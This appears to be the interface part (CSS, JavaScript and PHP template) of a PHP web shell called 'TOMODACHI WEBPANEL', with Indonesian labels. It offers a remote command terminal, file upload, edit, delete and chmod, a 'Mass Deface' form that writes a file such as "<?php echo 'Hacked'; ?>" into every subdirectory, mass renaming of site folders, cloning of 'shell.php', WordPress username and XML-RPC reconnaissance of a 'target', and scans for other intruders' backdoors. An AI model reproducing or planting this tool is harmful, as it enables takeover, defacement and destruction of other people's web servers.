    border-radius: 4px;
    animation: fadeOut 5s forwards;
    text-align: center;
}
.flash-success {background: rgba(0, 255, 0, 0.1); border: 1px solid #00ff00; color: #00ff00;}
.flash-error {background: rgba(255, 0, 0, 0.1); border: 1px solid #ff0000; color: #ff0000;}
.flash-info {background: rgba(0, 191, 255, 0.1); border: 1px solid #00bfff; color: #00bfff;}
@keyframes fadeOut {
    0% {opacity: 1;}
    70% {opacity: 1;}
    100% {opacity: 0; display: none;}
}
.terminal-prompt {
    color: #00ff00;
    font-weight: bold;
}
.edit-container {
    background:#161b22;
    padding:15px;
    border-radius:5px;
    margin-bottom:15px;
    border:1px solid #30363d;
}
</style>
<script>
function toggleSelectAll(source) {
    checkboxes = document.getElementsByName('selected_files[]');
    for(var i=0; i<checkboxes.length; i++) {
        checkboxes[i].checked = source.checked;
    }
}

function showMassMoveForm() {
    var checkboxes = document.getElementsByName('selected_files[]');
    var checkedCount = 0;
    var selectedFiles = [];
    
    for(var i=0; i<checkboxes.length; i++) {
        if(checkboxes[i].checked) {
            checkedCount++;
            selectedFiles.push(checkboxes[i].value);
        }
    }
    
    if(checkedCount > 0) {
        var form = document.getElementById('mass_move_form');
        var fileList = document.getElementById('selected_files_list');
        fileList.innerHTML = '';
        
        selectedFiles.forEach(function(file) {
            var li = document.createElement('li');
            li.textContent = file;
            li.style.margin = '2px 0';
            fileList.appendChild(li);
        });
        
        form.style.display = 'block';
    } else {
        alert('Pilih setidaknya satu file/folder!');
    }
}

function confirmMassDelete() {
    var checkboxes = document.getElementsByName('selected_files[]');
    var checkedCount = 0;
    
    for(var i=0; i<checkboxes.length; i++) {
        if(checkboxes[i].checked) checkedCount++;
    }
    
    if(checkedCount > 0) {
        return confirm('Yakin ingin menghapus ' + checkedCount + ' item yang dipilih?');
    } else {
        alert('Pilih setidaknya satu file/folder!');
        return false;
    }
}

function toggleMusic() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        if (xhr.status === 200) {
            var musicBtn = document.getElementById('musicBtn');
            var musicAudio = document.getElementById('backgroundMusic');
            if(xhr.responseText === 'playing') {
                musicBtn.innerHTML = '🔊 MUSIC ON';
                musicBtn.style.background = '#ff0000';
                if(musicAudio) {
                    musicAudio.play();
                }
            } else {
                musicBtn.innerHTML = '🔇 MUSIC OFF';
                musicBtn.style.background = '#21262d';
                if(musicAudio) {
                    musicAudio.pause();
                }
            }
        }
    };
    xhr.send('toggle_music_ajax=1');
}

// Auto-focus terminal input
document.addEventListener('DOMContentLoaded', function() {
    var terminalInput = document.querySelector('input[name="terminal_command"]');
    if(terminalInput) {
        terminalInput.focus();
    }
    
    // Auto-hide flash messages after 5 seconds
    setTimeout(function() {
        var flashMessages = document.querySelectorAll('.flash-message');
        flashMessages.forEach(function(msg) {
            msg.style.display = 'none';
        });
    }, 5000);
});
</script>
</head>
<body>
<!-- Header Section -->
<div style="text-align: center; margin-bottom: 15px;">
    <span class="panel-title">TOMODACHI WEBPANEL LIMITED VIP</span>
    <div class="system-info">
        Uname: <?=php_uname('n')?> | PHP: <?=$php_version?> | HDD: <?=$hdd_info?> | Cwd: <?=htmlspecialchars($cwd)?>
    </div>
    <div class="nav-buttons">
        <form method="post" style="display:inline;">
            <button type="submit" name="nav_up">↖ UP</button>
        </form>
        <form method="post" style="display:inline;">
            <button type="submit" name="nav_home">🏠 HOME</button>
        </form>
        <button type="button" id="musicBtn" onclick="toggleMusic()" style="background:<?=isset($_SESSION['music_playing']) && $_SESSION['music_playing'] ? '#ff0000' : '#21262d'?>">
            <?=isset($_SESSION['music_playing']) && $_SESSION['music_playing'] ? '🔊 MUSIC ON' : '🔇 MUSIC OFF'?>
        </button>
    </div>
</div>

<!-- Flash Messages -->
<?php foreach($flash_messages as $flash): ?>
<div class="flash-message flash-<?=$flash['type']?>">
    <?=htmlspecialchars($flash['message'])?>
</div>
<?php endforeach; ?>

<?php if(isset($_SESSION['music_playing']) && $_SESSION['music_playing']): ?>
<audio id="backgroundMusic" autoplay loop>
    <source src="https://e.top4top.io/m_3644skn5k1.mp3" type="audio/mpeg">
    Browser Anda tidak mendukung elemen audio.
</audio>
<script>
document.getElementById('backgroundMusic').volume = 0.3;
</script>
<?php endif; ?>

<!-- Inline File Editing -->
<?php if($editing_file): ?>
<div class="edit-container">
<strong>Editing File: <?=htmlspecialchars(basename($editing_file))?></strong><br>
<form method="post">
<textarea name="content" rows="15" style="width:100%;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;padding:5px; font-family: monospace;">
<?=htmlspecialchars($file_content)?>
</textarea><br>
<input type="hidden" name="edit_file_path" value="<?=htmlspecialchars($editing_file)?>">
<button type="submit" name="save_edit">SAVE</button>
<button type="submit" name="cancel_edit">CANCEL</button>
</form>
</div>
<?php endif; ?>

<!-- Upload -->
<form method="post" enctype="multipart/form-data" style="margin-bottom:10px; text-align: center;">
<input type="file" name="f" required>
<button type="submit">Upload</button>
</form>

<!-- Create -->
<form method="post" style="margin-bottom:10px; text-align: center;">
<input type="text" name="n" placeholder="name" required>
<select name="t"><option value="f">File</option><option value="d">Folder</option></select>
<button type="submit">Create</button>
</form>

<!-- WordPress Info -->
<?php if(!empty($wp_info) && $wp_info['wp_detected']): ?>
<div class="wp-info-container">
<strong>WordPress Target Information:</strong><br><br>
<strong>Domain:</strong> <?=htmlspecialchars($wp_info['domain'])?><br>
<strong>Login URL:</strong> <a href="<?=htmlspecialchars($wp_info['login_url'])?>" target="_blank"><?=htmlspecialchars($wp_info['login_url'])?></a><br>
<strong>Scan Date:</strong> <?=htmlspecialchars($wp_info['scan_date'])?><br>
<strong>Status Website:</strong> 
<span class="<?=$wp_info['status'] == 'online' ? 'status-online' : 'status-offline'?>">
    <?=strtoupper(htmlspecialchars($wp_info['status']))?>
</span><br>
<strong>XML-RPC Status:</strong> 
<span class="<?=$wp_info['xmlrpc_status'] == 'online' ? 'status-online' : 'status-offline'?>">
    <?=strtoupper(htmlspecialchars($wp_info['xmlrpc_status']))?>
</span><br>
<strong>Usernames Found:</strong><br>
<?php if(!empty($wp_info['usernames'])): ?>
<ul>
<?php foreach($wp_info['usernames'] as $username): ?>
<li><?=htmlspecialchars($username)?></li>
<?php endforeach; ?>
</ul>
<?php else: ?>
No usernames found<br>
<?php endif; ?>
</div>
<?php endif; ?>

<!-- Hacked Files Scan Results -->
<?php if(!empty($hacked_results)): ?>
<div class="scan-results-container">
<strong>Hacked Files Scan Results:</strong><br>
<?php foreach($hacked_results as $result): ?>
<div class="scan-item">
<strong>Domain/Path:</strong> <?=htmlspecialchars($result['domain_path'])?><br>
<strong>File Path:</strong> <?=htmlspecialchars($result['file_path'])?><br>
<strong>Filename:</strong> <?=htmlspecialchars($result['filename'])?><br>
<strong>Upload Time:</strong> <?=htmlspecialchars($result['upload_time'])?><br>
<strong>Status:</strong> 
<span class="<?=$result['status'] == 'Active' ? 'status-online' : 'status-offline'?>">
    <?=htmlspecialchars($result['status'])?>
</span><br>
<strong>Keywords Found:</strong> <?=htmlspecialchars($result['keywords'])?><br>
<hr>
</div>
<?php endforeach; ?>
</div>
<?php endif; ?>

<!-- New Files Scan Results -->
<?php if(!empty($new_files_results)): ?>
<div class="scan-results-container">
<strong>New Files Scan Results:</strong><br>
<?php foreach($new_files_results as $result): ?>
<div class="scan-item">
<strong>Domain/Path:</strong> <?=htmlspecialchars($result['domain_path'])?><br>
<strong>File Path:</strong> <?=htmlspecialchars($result['file_path'])?><br>
<strong>Filename:</strong> <?=htmlspecialchars($result['filename'])?><br>
<strong>Upload Time:</strong> <?=htmlspecialchars($result['upload_time'])?><br>
<strong>Status:</strong> 
<span class="<?=$result['status'] == 'Active' ? 'status-online' : 'status-offline'?>">
    <?=htmlspecialchars($result['status'])?>
</span><br>
<strong>Type:</strong> <?=htmlspecialchars($result['type'])?><br>
<hr>
</div>
<?php endforeach; ?>
</div>
<?php endif; ?>

<!-- Domain Scan Results -->
<?php if(!empty($domain_results) && $domain_results['count'] > 0): ?>
<div class="scan-results-container">
<strong>Domain Scan Results:</strong><br><br>
<strong>Total Domains Found:</strong> <?=htmlspecialchars($domain_results['count'])?><br><br>
<?php foreach($domain_results['domains'] as $domain): ?>
<div class="scan-item">
<strong>Domain:</strong> <?=htmlspecialchars($domain['domain'])?><br>
<strong>Found in:</strong> <?=htmlspecialchars($domain['path'])?><br>
<strong>Status:</strong> 
<span class="<?=$domain['status'] == 'Active' ? 'status-online' : 'status-offline'?>">
    <?=htmlspecialchars($domain['status'])?>
</span><br>
<hr>
</div>
<?php endforeach; ?>
</div>
<?php endif; ?>

<!-- Scan Results -->
<?php if(!empty($scan_results)): ?>
<div class="scan-results-container">
<strong>Backdoor Scan Results:</strong><br>
<?php foreach($scan_results as $result): ?>
<div class="scan-item">
<strong>Domain:</strong> <?=htmlspecialchars($result['domain'])?><br>
<strong>Path:</strong> <?=htmlspecialchars($result['path'])?><br>
<strong>Filename:</strong> <?=htmlspecialchars($result['filename'])?><br>
<strong>Detected Patterns:</strong> <?=htmlspecialchars($result['patterns'])?><br>
<strong>Size:</strong> <?=htmlspecialchars($result['size'])?><br>
<strong>Pattern Count:</strong> <?=htmlspecialchars($result['count'])?><br>
<strong>Last Modified:</strong> <?=htmlspecialchars($result['modified'])?><br>
<hr>
</div>
<?php endforeach; ?>
</div>
<?php endif; ?>

<!-- History -->
<?php if(!empty($history)): ?>
<div class="scan-results-container">
<strong>Activity History:</strong><br>
<?php foreach($history as $entry): ?>
<?=htmlspecialchars($entry)?><br>
<?php endforeach; ?>
</div>
<?php endif; ?>

<!-- Mass Move Form -->
<div class="mass-move-form" id="mass_move_form" style="display: none;">
<strong>Mass Move Files</strong><br>
<form method="post" style="margin-top:5px;">
<div id="selected_files_list" style="max-height: 100px; overflow-y: auto; margin: 5px 0; padding: 5px; background: #0d1117; border-radius: 3px;"></div>
<input type="hidden" name="selected_files[]" id="mass_move_files">
<label>Target Path:</label><br>
<input type="text" name="target_path_move" value="<?=htmlspecialchars($cwd)?>" style="width:300px;margin:5px 0;"><br>
<button type="submit" name="mass_move_submit">MOVE FILES</button>
<button type="button" onclick="document.getElementById('mass_move_form').style.display='none'">CANCEL</button>
</form>
</div>

<!-- Cloning Form -->
<?php if($show_cloning_form): ?>
<div class="cloning-container">
<strong>Cloning File/Folder</strong><br>
<form method="post">
<label>Source File/Folder Name:</label><br>
<input type="text" name="clone_source" placeholder="shell.php" required style="width:100%;margin:5px 0;"><br>
<label>Target Path:</label><br>
<input type="text" name="clone_target_path" value="<?=htmlspecialchars($cwd)?>" style="width:100%;margin:5px 0;"><br>
<small style="color:#8b949e;">File akan dicopy ke target path dengan nama unik (contoh: shell(1).php)</small><br><br>
<button type="submit" name="clone_submit">CLONE</button>
<button type="button" onclick="window.location.href='?c=<?=urlencode($cwd)?>'">CANCEL</button>
</form>
</div>
<?php endif; ?>

<!-- Mass Suspected Form -->
<?php if($show_suspected_form): ?>
<div class="suspected-container">
<strong>Mass Suspected (Rename Files)</strong><br>
<form method="post">
<label>Keyword to append:</label><br>
<input type="text" name="suspected_keyword" value=".suspected" required style="width:100%;margin:5px 0;"><br>
<label>Target Path (rename files in this directory and subdirectories):</label><br>
<input type="text" name="suspected_path" value="<?=htmlspecialchars($cwd)?>" required style="width:100%;margin:5px 0;"><br>
<small style="color:#8b949e;">Semua file dan folder di path ini akan direname dengan menambahkan keyword (contoh: wp-admin → wp-admin.suspected)</small><br><br>
<button type="submit" name="mass_suspected_submit">RENAME MASSAL</button>
<button type="button" onclick="window.location.href='?c=<?=urlencode($cwd)?>'">CANCEL</button>
</form>
</div>
<?php endif; ?>

<!-- Mass Deface Form (Create File Massal) -->
<?php if($show_mass_form): ?>
<div class="mass-form-container">
<strong>Mass Deface (Create File Massal)</strong><br>
<form method="post">
<label>File Name to Create:</label><br>
<input type="text" name="deface_filename" placeholder="index.php" required style="width:100%;margin:5px 0;"><br>
<label>Content:</label><br>
<textarea name="deface_content" rows="5" placeholder="&lt;?php echo 'Hacked'; ?&gt;" style="width:100%;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;padding:5px;" required></textarea><br>
<label>Target Path (create file in this directory and all subdirectories):</label><br>
<input type="text" name="deface_path" value="<?=htmlspecialchars($cwd)?>" required style="width:100%;margin:5px 0;"><br>
<small style="color:#8b949e;">File akan dibuat di semua directory dan subdirectory dalam path target</small><br><br>
<button type="submit" name="mass_deface_submit">CREATE MASSAL</button>
<button type="button" onclick="window.location.href='?c=<?=urlencode($cwd)?>'">CANCEL</button>
</form>
</div>
<?php endif; ?>

<!-- Terminal -->
<?php if($show_terminal): ?>
<div class="terminal-container">
<strong>Terminal</strong><br>
<form method="post">
<input type="hidden" name="terminal_cwd" value="<?=htmlspecialchars($terminal_cwd)?>">
<label class="terminal-prompt">[user@<?=php_uname('n')?>] <?=$terminal_cwd?> $</label><br>
<input type="text" name="terminal_command" placeholder="Type command here..." style="width:85%;" autocomplete="off" autofocus>
<button type="submit" name="terminal_cmd">EXECUTE</button>
<button type="button" onclick="window.location.href='?c=<?=urlencode($cwd)?>'">CLOSE</button>
</form>

<?php if(!empty($terminal_output)): ?>
<div class="terminal-command"><?=htmlspecialchars($terminal_output)?></div>
<?php endif; ?>

<?php if(!empty($terminal_result)): ?>
<div class="terminal-result"><?=htmlspecialchars($terminal_result)?></div>
<?php endif; ?>
</div>
<?php endif; ?>

<!-- File List with Checkboxes -->
<form method="post" id="massForm">
<table>
<tr>
    <th class="checkbox-cell"><input type="checkbox" onclick="toggleSelectAll(this)"></th>
    <th>Name</th>
    <th>Size</th>
    <th>Permissions</th>
    <th>Date Modified</th>
    <th>Actions</th>
</tr>
<?php
if($cwd!=='/') {
    echo "<tr>";
    echo "<td class='checkbox-cell'>-</td>";
    echo "<td class='file-item'><a href='?c=".urlencode(dirname($cwd))."' class='hover-effect'>..</a></td>";
    echo "<td>-</td><td>-</td><td>-</td><td>-</td>";
    echo "</tr>";
}

foreach(scandir($cwd) as $f){
    if($f=='.'||$f=='..') continue;
    $p=$cwd.'/'.$f;
    $perms = fileperms($p);
    $perm_str = (is_dir($p) ? 'd' : '-') . format_perms($perms);
    $perm_color = get_perm_color($perms);
    $size = is_dir($p) ? 'DIR' : format_size(filesize($p));
    $mtime = date('Y-m-d H:i:s', filemtime($p));
    $new_info = null;
    foreach($_SESSION['new_files'] ?? [] as $new) {
        if($new['path'] === $p) {
            $new_info = $new;
            break;
        }
    }
    $new_label = $new_info ? "<span class='new-label' title='Uploaded at: " . date('Y-m-d H:i:s', $new_info['time']) . "'> (NEW)</span>" : '';
    echo "<tr>";
    echo "<td class='checkbox-cell'><input type='checkbox' name='selected_files[]' value='".htmlspecialchars($f)."'></td>";
    echo "<td class='file-item'><span class='hover-effect'>".(is_dir($p)?"<a href='?c=".urlencode($p)."'>📁 $f</a>$new_label":"<a href='$p' download>📄 $f</a>$new_label")."</span></td>";
    echo "<td>$size</td>";
    $anim_class = 'perm-' . $perm_color;
    echo "<td class='$anim_class'>$perm_str</td>";
    echo "<td>$mtime</td>";
    echo "<td>";
    echo "<form method='post' style='display:inline;'><input type='hidden' name='del_file' value='$f'><button type='submit' onclick='return confirm(\"Delete?\")'>DELETE</button></form> | ";
    echo "<form method='post' style='display:inline;'><input type='hidden' name='rename_old' value='$f'><input type='text' name='rename_new' placeholder='New name' required class='small-input'><button type='submit'>RENAME</button></form> | ";
    echo "<form method='post' style='display:inline;'><input type='hidden' name='chmod_file' value='$f'><input type='text' name='chmod_perm' placeholder='0755' required class='small-input'><button type='submit'>CHMOD</button></form>";
    if(!is_dir($p)) echo " | <form method='post' style='display:inline;'><input type='hidden' name='edit_file' value='$f'><button type='submit'>EDIT</button></form>";
    echo "</td></tr>";
}
?>
</table>

<!-- Mass Action Buttons -->
<div style="margin-top:10px;padding:10px;background:#161b22;border-radius:5px; text-align: center;">
<button type="submit" name="mass_delete" onclick="return confirmMassDelete()">MASS DELETE</button>
<button type="button" onclick="showMassMoveForm()">MASS MOVE</button>
<button type="submit" name="toggle_cloning">CLONING</button>
<button type="submit" name="toggle_suspected">MASS SUSPECTED</button>
</div>
</form>

<!-- Bottom Actions -->
<div style="margin-top:20px;background:#161b22;padding:10px;border-radius:5px; text-align: center;">
<form method="post" style="display:inline;">
<button type="submit" name="scan_backdoor">🔍 SCAN BACKDOOR</button>
</form> |
<form method="post" style="display:inline;">
<button type="submit" name="show_history">HISTORY</button>
</form> |
<form method="post" style="display:inline;">
<button type="submit" name="toggle_mass_form">MASS DEFACE</button>
</form> |
<form method="post" style="display:inline;">
<button type="submit" name="wp_info">WORDPRESS INFO</button>
</form> |
<form method="post" style="display:inline;">
<button type="submit" name="scan_hacked">SCAN PENGHUNI</button>
</form> |
<form method="post" style="display:inline;">
<button type="submit" name="scan_new">SCAN (NEW)</button>
</form> |
<form method="post" style="display:inline;">
<button type="submit" name="scan_domains">VIEW DOMAINS</button>
</form> |
<form method="post" style="display:inline;">
<button type="submit" name="show_terminal">TERMINAL</button>
</form>
</div>
</body>
</html>
